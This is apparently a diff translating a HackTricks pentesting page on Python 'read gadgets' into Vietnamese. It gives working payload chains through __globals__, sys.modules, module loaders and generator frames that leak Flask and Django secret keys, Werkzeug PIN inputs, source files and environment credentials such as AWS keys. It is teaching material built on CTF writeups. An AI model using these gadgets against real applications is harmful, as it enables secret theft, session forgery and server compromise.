@@ -1,35 +1,35 @@
-# Python Internal Read Gadgets
+# Các gadget đọc dữ liệu nội bộ của Python
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Basic Information
+## Thông tin cơ bản
 
-Different vulnerabilities such as [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) or [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) might allow you to **read python internal data but won't allow you to execute code**. Therefore, a pentester will need to make the most of these read permissions to **obtain sensitive privileges and escalate the vulnerability**.
+Các lỗ hổng khác nhau như [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) hoặc [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) có thể cho phép bạn **đọc dữ liệu nội bộ của Python nhưng không cho phép thực thi code**. Vì vậy, pentester cần tận dụng tối đa quyền đọc này để **thu thập các đặc quyền nhạy cảm và nâng cấp lỗ hổng**.
 
-### Flask - Read secret key
+### Flask - Đọc secret key
 
-The main page of a Flask application will probably have the **`app`** global object where this **secret is configured**.
+Trang chính của ứng dụng Flask có thể sẽ có đối tượng global **`app`** nơi **secret này được cấu hình**.
 
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
 
-In this case it's possible to access this object just using any gadget to **access global objects** from the [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).
+Trong trường hợp này, có thể truy cập object này chỉ bằng bất kỳ gadget nào để **access global objects** từ trang [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).
 
-In the case where **the vulnerability is in a different python file**, you need a gadget to traverse files to get to the main one to **access the global object `app.secret_key`** and be able to [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
+Nếu **vulnerability nằm trong một file Python khác**, bạn cần một gadget để duyệt qua các file và đến file chính nhằm **access global object `app.secret_key`**, từ đó có thể [**escalate privileges** khi biết key này](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
-A payload like this one [from this writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
+Một payload như payload này [từ writeup này](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
 
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
 
-Use this payload to **read `app.secret_key`**. If the original bug also gives you a write primitive (for example, class pollution), the same path can be used to replace it and sign more privileged Flask cookies.
+Dùng payload này để **đọc `app.secret_key`**. Nếu lỗi ban đầu cũng cho phép bạn ghi (ví dụ: class pollution), bạn có thể dùng cùng đường dẫn để thay thế nó và ký các Flask cookie có đặc quyền cao hơn.
 
-### Werkzeug - machine_id and node uuid
+### Werkzeug - machine_id và node uuid
 
-[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) you will be able to access the **machine_id** and the **uuid** node, which are the **private bits** you need to [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) and access the python console in `/console` if the **debug mode is enabled**:<sup>[[4]](#references)</sup>
+[**Dùng các payload này từ bài viết**](https://vozec.fr/writeups/tweedle-dum-dee/) để truy cập **machine_id** và **uuid** của node, vốn là các **thông tin riêng tư** bạn cần để [**tạo Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) và truy cập Python console tại `/console` nếu **debug mode được bật**:<sup>[[4]](#references)</sup>
 
 ```python
 {ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
@@ -37,13 +37,13 @@ Use this payload to **read `app.secret_key`**. If the original bug also gives yo
 ```
 
 > [!WARNING]
-> Note that you can get the **servers local path to the `app.py`** generating some **error** in the web page which will **give you the path**.
+> Lưu ý rằng bạn có thể lấy được **đường dẫn cục bộ của máy chủ tới `app.py`** bằng cách tạo ra một số **lỗi** trên trang web, khiến **đường dẫn bị tiết lộ**.
 
-If the vulnerability is in a different python file, check the previous Flask trick to access the objects from the main python file.
+Nếu lỗ hổng nằm trong một file Python khác, hãy xem thủ thuật Flask trước đó để truy cập các đối tượng từ file Python chính.
 
-### Django - SECRET_KEY and settings module
+### Django - SECRET_KEY và module settings
 
-The Django settings object is cached in `sys.modules` once the application starts. With only read primitives you can leak the **`SECRET_KEY`**, fallback keys, database credentials or signing salts:
+Đối tượng settings của Django được lưu trong bộ nhớ đệm của `sys.modules` khi ứng dụng khởi chạy. Chỉ với các primitive đọc, bạn có thể làm lộ **`SECRET_KEY`**, các khóa dự phòng, thông tin xác thực cơ sở dữ liệu hoặc signing salts:
 
 ```python
 # When DJANGO_SETTINGS_MODULE is set (usual case)
@@ -55,17 +55,17 @@ a = sys.modules['django.conf'].settings
  a.SESSION_ENGINE, a.SESSION_SERIALIZER)
 ```
 
-If the vulnerable gadget is in another module, walk globals first:
+Nếu gadget dễ bị khai thác nằm trong module khác, hãy duyệt qua globals trước:
 
 ```python
 __init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
 ```
 
-`SECRET_KEY_FALLBACKS` are just as valuable as the current `SECRET_KEY`: they still validate old signed values during rotation.<sup>[[1]](#references)</sup> Also leak `SESSION_ENGINE` and `SESSION_SERIALIZER` to quickly determine whether the impact is only cookie forgery or something stronger. For the web impact details, check the [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).
+`SECRET_KEY_FALLBACKS` có giá trị ngang với `SECRET_KEY` hiện tại: chúng vẫn xác thực các giá trị đã ký cũ trong quá trình xoay vòng.<sup>[[1]](#references)</sup> Đồng thời leak `SESSION_ENGINE` và `SESSION_SERIALIZER` để nhanh chóng xác định tác động chỉ giới hạn ở việc giả mạo cookie hay còn nghiêm trọng hơn. Để biết chi tiết về tác động trên web, hãy xem [**trang pentesting Django**](../../network-services-pentesting/pentesting-web/django.md).
 
-### Module loader gadgets - read source code and files
+### Module loader gadgets - đọc mã nguồn và tệp
 
-Loaded Python modules usually keep a `__loader__`. File-backed loaders frequently expose `get_source()` and `get_data()`, which are perfect **read-only primitives** when you can already reach a module object but not `open()`:
+Các module Python đã được tải thường giữ một `__loader__`. Các loader dựa trên tệp thường cung cấp `get_source()` và `get_data()`, là những **primitive chỉ đọc** rất hữu ích khi bạn đã truy cập được đối tượng module nhưng không thể dùng `open()`:
 
 ```python
 m = __init__.__globals__['sys'].modules['__main__']
@@ -73,9 +73,9 @@ m.__loader__.get_source(m.__name__)   # source of app.py / __main__
 m.__loader__.get_data(m.__file__)     # raw bytes of the same file
 ```
 
-This is very useful to dump **config modules, blueprints, helper files or hidden routes** and recover API keys, DSNs, flag paths or additional gadget entry points.
+Cách này rất hữu ích để dump **các module config, blueprint, file trợ giúp hoặc route ẩn** và lấy lại API key, DSN, đường dẫn flag hoặc các điểm vào gadget bổ sung.
 
-If you only have subclass enumeration, search the loader by name instead of hard-coding an index:
+Nếu chỉ có thể liệt kê các subclass, hãy tìm loader theo tên thay vì hard-code chỉ mục:
 
 ```python
 # unbound call: first argument acts as a dummy self
@@ -84,18 +84,18 @@ If you only have subclass enumeration, search the loader by name instead of hard
 
 ### Generator / coroutine frame globals
 
-If you can create or reach a generator/coroutine object, its frame can leak globals **without needing any function `__globals__` gadget**. This is useful against filters that only block dunder names and forget frame attributes such as `gi_frame`, `ag_frame`, `cr_frame` or `f_globals`:
+Nếu có thể tạo hoặc truy cập một đối tượng generator/coroutine, frame của nó có thể làm lộ globals **mà không cần gadget `__globals__` của bất kỳ function nào**. Điều này hữu ích khi khai thác các bộ lọc chỉ chặn tên dunder nhưng bỏ sót các frame attribute như `gi_frame`, `ag_frame`, `cr_frame` hoặc `f_globals`:
 
 ```python
 (_ for _ in ()).gi_frame.f_globals['__builtins__']
 (_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
 ```
 
-Once you have the frame globals, continue exactly as in the other gadgets (`sys.modules`, settings objects, `os.environ`, etc.). Recent sandbox escapes keep rediscovering this because `gi_frame` and `f_globals` are not dunder attributes and often survive naive deny-lists.
+Khi đã lấy được các global của frame, hãy tiếp tục chính xác như với các gadget khác (`sys.modules`, các object settings, `os.environ`, v.v.). Các sandbox escape gần đây liên tục phát hiện lại kỹ thuật này vì `gi_frame` và `f_globals` không phải là thuộc tính dunder và thường vẫn tồn tại sau các deny-list đơn giản.
 
-### Environment variables / cloud creds via loaded modules
+### Biến môi trường / thông tin xác thực cloud qua các module đã tải
 
-Many jails still import `os` or `sys` somewhere. You can abuse any reachable function `__init__.__globals__` to pivot to the already-imported `os` module and dump **environment variables** containing API tokens, cloud keys or flags:
+Nhiều jail vẫn import `os` hoặc `sys` ở đâu đó. Bạn có thể lạm dụng bất kỳ hàm nào có thể truy cập được qua `__init__.__globals__` để chuyển hướng đến module `os` đã được import và trích xuất **biến môi trường** chứa API token, cloud key hoặc flag:
 
 ```python
 # Classic os._wrap_close subclass index may change per version
@@ -103,28 +103,27 @@ cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
 cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
 ```
 
-If the subclass index is filtered, use loaders:
+Nếu chỉ mục subclass bị lọc, hãy sử dụng loaders:
 
 ```python
 __loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
 ```
 
-Environment variables are frequently the only secrets needed to move from read to full compromise (cloud IAM keys, database URLs, signing keys, etc.).
+Các biến môi trường thường là những bí mật duy nhất cần có để chuyển từ quyền đọc sang toàn quyền xâm nhập (khóa cloud IAM, URL database, khóa ký, v.v.).
 
 ### Django-Unicorn class pollution (CVE-2025-24370)
 
-`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), affected versions `<0.61.0`) allowed **class pollution** through crafted component requests. A property path such as `__init__.__globals__` could reach component-module globals and imported modules; the advisory demonstrates overwriting Django's `SECRET_KEY` and values in `os.environ`, rather than a read-only exploit.<sup>[[5]](#references)</sup> If a separate bug provides read access to the same object graph, those globals may expose configuration and credentials without requiring code execution.
+`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), các phiên bản bị ảnh hưởng `<0.61.0`) cho phép **class pollution** thông qua các request component được tạo có chủ đích. Đường dẫn thuộc tính như `__init__.__globals__` có thể truy cập các biến toàn cục của module component và các module đã import; advisory minh họa việc ghi đè `SECRET_KEY` của Django và các giá trị trong `os.environ`, thay vì một khai thác chỉ đọc.<sup>[[5]](#references)</sup> Nếu một lỗi riêng biệt cho phép đọc cùng đồ thị đối tượng đó, các biến toàn cục này có thể làm lộ cấu hình và thông tin xác thực mà không cần thực thi mã.
 
-### Gadget collections for chaining
+### Các bộ sưu tập gadget để kết hợp khai thác
 
-Recent CTFs and pyjail research show reliable read chains built only with attribute access and subclass enumeration. Community-maintained lists such as [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) catalog hundreds of minimal gadgets you can combine to traverse from objects to `__globals__`, `sys.modules` and finally sensitive data.<sup>[[2]](#references)</sup> Prefer **attribute/name based searches** over raw subclass indexes because the position of `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, etc. changes between Python versions and with extra imported libraries.
+Các CTF gần đây và nghiên cứu pyjail cho thấy có những chuỗi đọc đáng tin cậy chỉ cần truy cập thuộc tính và liệt kê subclass. Các danh sách do cộng đồng duy trì như [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) tập hợp hàng trăm gadget tối giản mà bạn có thể kết hợp để đi từ các đối tượng đến `__globals__`, `sys.modules` và cuối cùng là dữ liệu nhạy cảm.<sup>[[2]](#references)</sup> Nên tìm kiếm dựa trên **thuộc tính/tên** thay vì chỉ số subclass thô, vì vị trí của `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, v.v. thay đổi giữa các phiên bản Python và tùy theo các thư viện được import thêm.
 
 ## References
 
-- [1] [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
-- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
-- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
-- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
-- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
-
+- [1] [Tài liệu về ký mã hóa của Django](https://docs.djangoproject.com/en/6.0/topics/signing/)
+- [2] [pyjailbreaker – wiki gadget cho sandbox Python](https://github.com/jailctf/pyjailbreaker)
+- [3] [CTFtime.org / idekCTF 2022 / task manager / bài viết lời giải](https://ctftime.org/writeup/36082)
+- [4] [Tweedle Dum & Dee – bài viết lời giải FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
+- [5] [Lỗ hổng Class Pollution của Django-Unicorn, dẫn đến RCE, XSS, DoS và vượt qua xác thực (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
 {{#include ../../banners/hacktricks-training.md}}
